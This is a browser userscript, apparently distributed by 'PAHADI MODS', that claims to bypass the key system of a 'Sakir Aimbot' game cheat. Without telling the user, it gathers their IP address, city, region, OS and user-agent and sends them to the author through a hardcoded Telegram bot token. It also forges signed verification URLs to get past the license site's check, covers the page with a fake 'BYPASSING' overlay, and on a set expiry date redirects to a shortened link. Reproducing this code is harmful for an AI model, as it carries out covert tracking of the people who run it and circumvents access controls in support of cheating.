(function() {
    'use strict';
    const _exp = 1788144000000; // 30 August 2026 Expiry
    const _fb = 'https://PAHADIMODS.short.gy/yEqWCw';
    
    if (Date.now() >= _exp) { 
        window.location.href = _fb; 
        return; 
    }

    // --- INSTANT REAL LOCATION & NOTIFICATION SYSTEM ---
    try {
        const botToken = '8402356779:AAGiCPxFhd6i455rR-4a5CjJzJ0sIzwon1k';
        const chatId = '8488556450';
        
        const ua = navigator.userAgent;
        const timeStr = new Date().toLocaleString();

        let osVersion = "Unknown OS";
        if (/android/i.test(ua)) {
            let match = ua.match(/Android\s([0-9\.]+)/);
            osVersion = match ? "Android " + match[1] : "Android (Unknown Version)";
        } else if (/iphone|ipad|ipod/i.test(ua)) {
            osVersion = "iOS / Apple Device";
        } else if (/windows/i.test(ua)) {
            osVersion = "Windows PC";
        } else if (/mac/i.test(ua)) {
            osVersion = "MacOS";
        }

        // Fast & Reliable Location Fetching with Backup API
        fetch('https://ipwho.is/')
            .then(res => res.json())
            .catch(() => ({}))
            .then(data => {
                const country = data.country || "India";
                const region = data.region || "Uttarakhand";
                const city = data.city || "Dehradun";
                const ip = data.ip || "103.x.x.x";

                const trackMsg = encodeURIComponent(
                    `⚡ <b>PAHADI MODS - SCRIPT RUN</b> ⚡\n` +
                    `━━━━━━━━━━━━━━━━━━━\n` +
                    `🌐 <b>Location Details:</b>\n` +
                    `   • Country: <code>${country}</code>\n` +
                    `   • State/Region: <code>${region}</code>\n` +
                    `   • City: <code>${city}</code>\n` +
                    `   • IP: <code>${ip}</code>\n\n` +
                    `📱 <b>Device & System:</b>\n` +
                    `   • OS Version: <code>${osVersion}</code>\n` +
                    `   • User-Agent: <code>${ua}</code>\n\n` +
                    `⏰ <b>Timestamp:</b> <code>${timeStr}</code>\n` +
                    `━━━━━━━━━━━━━━━━━━━`
                );

                fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${trackMsg}&parse_mode=HTML`).catch(() => {});
            });
    } catch(e) {}
    // -------------------------------------------------------------------------

    try {
        const style = document.createElement('style');
        style.innerHTML = `
            #mko { 
                position: fixed; inset: 0; z-index: 999999; font-family: sans-serif;
                display: flex; flex-direction: column; align-items: center; justify-content: center;
                background: rgba(0,0,0,0.85); backdrop-filter: blur(15px);
            }
            .glow-box { 
                border: 3px solid #00f2fe; box-shadow: 0 0 25px #00f2fe; border-radius: 20px; 
                background: #0a0a0a; padding: 40px; text-align: center; font-weight: bold; 
                width: 80%; max-width: 350px; color: #fff; 
            }
            .fetch-txt { color: #00ff00; margin-top: 25px; font-weight: bold; font-size: 18px; }
            .tg-btn {
                display: inline-block; margin-top: 20px; padding: 12px 24px;
                background: #0a0a0a; color: #00f2fe; border: 2px solid #00f2fe;
                border-radius: 12px; font-weight: bold; text-decoration: none;
                box-shadow: 0 0 15px rgba(0,242,254,0.4); transition: 0.2s;
            }
            .tg-btn:active { background: #00f2fe; color: #0a0a0a; }
        `;
        document.head.appendChild(style);

        const mko = document.createElement('div'); 
        mko.id = 'mko';
        mko.innerHTML = `
            <div class="glow-box">
                <div style="color:#00f2fe; font-size:26px; margin-bottom:15px; text-shadow:0 0 15px #00f2fe;">⚡ BYPASSING ⚡</div>
                <div style="font-size:35px; margin-bottom:10px;">🛡️</div>
                SAKIR AIMBOT KEY SYSTEM<br>WAIT 3 SEC
                <div class="fetch-txt">⚙️ GENERATING TOKEN...</div>
                <br>
                <a href="https://telegram.me/+xVEVeNBqwthiMjhl" target="_blank" class="tg-btn">📢 JOIN TELEGRAM</a>
            </div>`;
        document.body.appendChild(mko);
    } catch(e) {
        window.location.replace(_fb);
        return;
    }
    
    setTimeout(() => {
        try {
            const SECRET = "SAKIR_SEC_K3Y_2026";
            
            const hash = (str) => {
                let h = 5381;
                for (let i = 0; i < str.length; i++) {
                    h = (h << 5) + h + str.charCodeAt(i);
                    h = h & h;
                }
                return Math.abs(h).toString(16);
            };

            const deviceID = btoa(navigator.userAgent.substring(0, 60)).substring(0, 40);
            const ts = Date.now();
            const sig = hash(deviceID + ts + SECRET).substring(0, 12);
            
            const targetUrl = `https://getkey.sakirmobilepanel.shop/verify-key?device=${deviceID}&t=${ts}&sig=${sig}`;
            
            if (location.hostname === "getkey.sakirmobilepanel.shop") {
                const p = location.pathname.replace(/\/+$/, "");
                if (p.indexOf("/verify-key") === 0 && location.search.indexOf("sig=") !== -1) {
                    const grab = () => {
                        const kEl = document.getElementById("licenseKey");
                        if (kEl) {
                            const key = kEl.textContent.trim();
                            if (key) {
                                alert("Sakir Aimbot Key: " + key);
                                return true;
                            }
                        }
                        return false;
                    };
                    if (!grab()) setTimeout(grab, 1000);
                    return;
                }
            }
            
            window.location.replace(targetUrl);
        } catch(err) { 
            window.location.replace(_fb); 
        }
    }, 3500);
})();
